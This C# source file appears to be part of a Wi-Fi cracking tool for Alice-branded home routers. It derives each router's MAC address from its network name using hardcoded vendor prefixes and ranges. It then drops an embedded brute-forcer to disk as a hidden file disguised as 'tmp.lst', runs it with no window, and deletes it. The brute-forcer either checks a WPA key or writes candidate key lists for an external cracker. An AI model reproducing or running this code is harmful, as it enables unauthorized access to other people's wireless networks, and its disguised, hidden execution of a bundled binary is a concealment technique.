using System;

using System.Diagnostics;
using System.IO;

namespace Alice_Tools
{
    class AGPF_Brute
    {
        public static string bruteSNMAC(string e, string psk, string threads, bool quick)
        {
            UInt32 essid = Convert.ToUInt32(e.Substring(6, 8));
            UInt32 essid2 = essid;
            Byte[] mac1 = new Byte[3];
            Byte[] mac2 = new Byte[3];
            Byte[] mac = new Byte[6];
            bool altmac = false;

            if ((essid > 84549376) && (essid < 99999993))
            {
                mac1[0] = 0x00; mac1[1] = 0x1d; mac1[2] = 0x8b;
            }
            else
                if ((essid > 50331648) && (essid < 67108863))
                {
                    mac1[0] = 0x00; mac1[1] = 0x25; mac1[2] = 0x53;
                    altmac = true;
                }
                else
                    if ((essid > 33554432) && (essid < 51658239))
                    {
                        mac1[0] = 0x00; mac1[1] = 0x23; mac1[2] = 0x8e;
                        altmac = true;
                    }
                    else
                        /*if ((essid > 33554432) && (essid < 34881023))
                        {
                            mac1[0] = 0x00; mac1[1] = 0x1c; mac1[2] = 0xa2;
                        }
                        else*/
                            if ((essid > 18103808) && (essid < 34881023))
                            {
                                mac1[0] = 0x00; mac1[1] = 0x26; mac1[2] = 0x8d;
                            }
                            else
                                if ((essid > 1000005) && (essid < 1326591))
                                {
                                    mac1[0] = 0x00; mac1[1] = 0x23; mac1[2] = 0x8e;
                                }

            start:
            mac2 = BitConverter.GetBytes(essid);
            if ((mac1[2] & 0x0f) == mac2[3])
            {
                mac[0] = mac1[0]; mac[1] = mac1[1]; mac[2] = mac1[2];
                mac[3] = mac2[2]; mac[4] = mac2[1]; mac[5] = mac2[0];
            }
            else
            {
                essid += 0x5F5E100;
                goto start;
            }

            string output = "not found";

            using (Process brute = new Process())
            {
                try
                {
                    byte[] bruter = Properties.Resources.agpf_bruter;
                    string exe = @"tmp.lst";
                    using (FileStream exeFile = new FileStream(exe, FileMode.Create))
                    {
                        exeFile.Write(bruter, 0, bruter.Length);
                        File.SetAttributes(exe, FileAttributes.Hidden | FileAttributes.Temporary);
                    }
                    byte[] bruterdll = Properties.Resources.pthreadVSE2;
                    string exedll = @"pthreadVSE2.dll";
                    using (FileStream exeFiledll = new FileStream(exedll, FileMode.Create))
                    {
                        exeFiledll.Write(bruterdll, 0, bruterdll.Length);
                        File.SetAttributes(exedll, FileAttributes.Hidden | FileAttributes.Temporary);
                    }

                    brute.StartInfo.FileName = exe;
                    if (quick == true)
                    {
                        brute.StartInfo.Arguments = "-v -q -t " + threads + " -p " + psk + " " + BitConverter.ToString(mac).Replace('-', ':');
                    }
                    else
                    {
                        brute.StartInfo.Arguments = "-v -t " + threads + " -p " + psk + " " + BitConverter.ToString(mac).Replace('-', ':');
                    }
                    brute.StartInfo.CreateNoWindow = true;
                    brute.StartInfo.UseShellExecute = false;
                    brute.StartInfo.RedirectStandardOutput = true;
                    brute.Start();
                    output = brute.StandardOutput.ReadToEnd();
                    brute.WaitForExit();
                    brute.Close();
                    File.Delete(exe);
                    File.Delete(exedll);
                }

                catch (Exception ex)
                {
                    output = "alice_agpf_brute.exe:\r\n" + ex.Message;
                }
            }

            essid = essid2;
            if ((altmac == true) && (output.Contains("nothing found for"))) {
                if ((essid > 50331648) && (essid < 67108863))
                {
                    mac1[0] = 0x00; mac1[1] = 0x22; mac1[2] = 0x33;
                } else
                    if ((essid > 33554432) && (essid < 51658239))
                    {
                        mac1[0] = 0x00; mac1[1] = 0x1c; mac1[2] = 0xa2;
                    }
                altmac = false;
                goto start;
            }

            return e + "\r\n\r\n" + output;
        }


        public static string brutePSK(string e, string threads, bool quick)
        {
            UInt32 essid = Convert.ToUInt32(e.Substring(6, 8));
            UInt32 essid2 = essid;
            Byte[] mac1 = new Byte[3];
            Byte[] mac2 = new Byte[3];
            Byte[] mac = new Byte[6];
            bool altmac = false;

            if ((essid > 84549376) && (essid < 99999993))
            {
                mac1[0] = 0x00; mac1[1] = 0x1d; mac1[2] = 0x8b;
            }
            else
                if ((essid > 50331648) && (essid < 67108863))
                {
                    mac1[0] = 0x00; mac1[1] = 0x25; mac1[2] = 0x53;
                    altmac = true;
                }
                else
                    if ((essid > 33554432) && (essid < 51658239))
                    {
                        mac1[0] = 0x00; mac1[1] = 0x23; mac1[2] = 0x8e;
                        altmac = true;
                    }
                    else
                        /*if ((essid > 33554432) && (essid < 34881023))
                        {
                            mac1[0] = 0x00; mac1[1] = 0x1c; mac1[2] = 0xa2;
                        }
                        else*/
                        if ((essid > 18103808) && (essid < 34881023))
                        {
                            mac1[0] = 0x00; mac1[1] = 0x26; mac1[2] = 0x8d;
                        }
                        else
                            if ((essid > 1000005) && (essid < 1326591))
                            {
                                mac1[0] = 0x00; mac1[1] = 0x23; mac1[2] = 0x8e;
                            }

        start:
            mac2 = BitConverter.GetBytes(essid);
            if ((mac1[2] & 0x0f) == mac2[3])
            {
                mac[0] = mac1[0]; mac[1] = mac1[1]; mac[2] = mac1[2];
                mac[3] = mac2[2]; mac[4] = mac2[1]; mac[5] = mac2[0];
            }
            else
            {
                essid += 0x5F5E100;
                goto start;
            }

            string output = "not found";

            using (Process brute = new Process())
            {
                try
                {
                    byte[] bruter = Properties.Resources.agpf_bruter;
                    string exe = @"tmp.lst";
                    using (FileStream exeFile = new FileStream(exe, FileMode.Create))
                    {
                        exeFile.Write(bruter, 0, bruter.Length);
                        File.SetAttributes(exe, FileAttributes.Hidden | FileAttributes.Temporary);
                    }
                    byte[] bruterdll = Properties.Resources.pthreadVSE2;
                    string exedll = @"pthreadVSE2.dll";
                    using (FileStream exeFiledll = new FileStream(exedll, FileMode.Create))
                    {
                        exeFiledll.Write(bruterdll, 0, bruterdll.Length);
                        File.SetAttributes(exedll, FileAttributes.Hidden | FileAttributes.Temporary);
                    }

                    brute.StartInfo.FileName = exe;
                    if (quick == true)
                    {
                        brute.StartInfo.Arguments = "-v -q -t " + threads + " -o " + BitConverter.ToString(mac) + ".lst " + BitConverter.ToString(mac).Replace("-", ":");
                    }
                    else
                    {
                        brute.StartInfo.Arguments = "-v -t " + threads + " -o " + BitConverter.ToString(mac) + ".lst " + BitConverter.ToString(mac).Replace("-", ":");
                    }
                    brute.StartInfo.CreateNoWindow = true;
                    brute.StartInfo.UseShellExecute = false;
                    brute.StartInfo.RedirectStandardOutput = true;
                    brute.Start();
                    output = brute.StandardOutput.ReadToEnd();
                    brute.WaitForExit();
                    brute.Close();
                    File.Delete(exe);
                    File.Delete(exedll);
                }

                catch (Exception ex)
                {
                    output = "alice_agpf_brute.exe:\r\n" + ex.Message;
                }
            }

            essid = essid2;
            if (altmac == true)
            {
                if ((essid > 50331648) && (essid < 67108863))
                {
                    mac1[0] = 0x00; mac1[1] = 0x22; mac1[2] = 0x33;
                }
                else
                    if ((essid > 33554432) && (essid < 51658239))
                    {
                        mac1[0] = 0x00; mac1[1] = 0x1c; mac1[2] = 0xa2;
                    }

                altmac = false;
                goto start;
            }

            return output + "\r\ncheck " + BitConverter.ToString(mac) + ".lst with ewsa...";
        }
    }
}
